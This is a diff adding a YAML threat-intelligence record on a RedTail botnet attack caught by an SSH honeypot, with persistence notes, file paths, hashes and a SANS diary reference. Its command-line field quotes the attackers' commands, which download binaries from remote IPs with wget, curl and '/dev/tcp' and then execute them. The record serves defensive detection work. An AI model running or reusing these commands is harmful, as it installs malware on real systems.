@@ -1,0 +1,63 @@
+description: This report details an automated attack campaign targeting systems via
+  SSH, utilizing a botnet operation with global coordination and architecture-specific
+  malware.
+attribution: Unknown (Botnet Operation)
+malware_families:
+- redtail
+TTPs:
+  processes:
+  - cowrie
+  - sshd
+  - isc-agent
+  commandline:
+  - 'cd /tmp
+    wget 209.141.34[.]106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_64
+    chmod +x KKveTTgaAAsecNNaaaa.x86_64
+    ./KKveTTgaAAsecNNaaaa.x86_64
+    rm -rf KKveTTgaAAsecNNaaaa.x86_64'
+  - 'nohup $SHELL -c "curl http://202.55.82[.]250:60140/linux -o /tmp/mEpGt06b5j'
+  - 'nohup $SHELL -c \"curl http://202.55.82.250:60140/linux -o /tm
+      p/mEpGt06b5j; if [ ! -f /tmp/mEpGt06b5j ]; then wget http://202.55.82.250:60140/linux -O /
+      tmp/mEpGt06b5j; fi; if [ ! -f /tmp/mEpGt06b5j ]; then exec 6<>/dev/tcp/202.55.82.250/601
+      40 && echo -n ''GET /linux'' >&6 && cat 0<&6 > /tmp/mEpGt06b5j ; chmod +x /tmp/mEpGt0
+      6b5j && /tmp/mEpGt06b5j CSKwgLxYG+KdmZqF+BdTqIG0M3R0...'
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: sshd
+    destination_address: 192.168.1.1
+    port: ''
+  - executable: isc-agent
+    destination_address: ''
+    port: ''
+  file_activity:
+  - /var/log/dshield.log
+  - /etc/cron.d/dshield
+  - /etc/dshield.ini
+  - /srv/cowrie/cowrie.cfg
+  - /etc/rsyslog.d/dshield.conf
+  - ipfirewall rules
+  - nf-firewall rules
+  - clean.sh
+  - setup.sh
+  - redtail.arm7
+  - redtail.arm8
+  - redtail.i686
+  - redtail.x86_64
+  persistence:
+  - SSH backdoors with immutable attributes
+  - Crontab modifications
+  - Rootkit components in the 'redtail' binaries
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: 2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf
+- hash: fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a
+- hash: 7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110
+- hash: b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb
+authors:
+-  Michal Ambrozkiewicz
+reference: https://isc.sans.edu/diary/Guest+Diary+Anatomy+of+a+Linux+SSH+Honeypot+Attack+Detailed+Analysis+of+Captured+Malware/32024/#comments
+date_of_publication: June 13, 2025
+file_creation_date: June 13, 2025
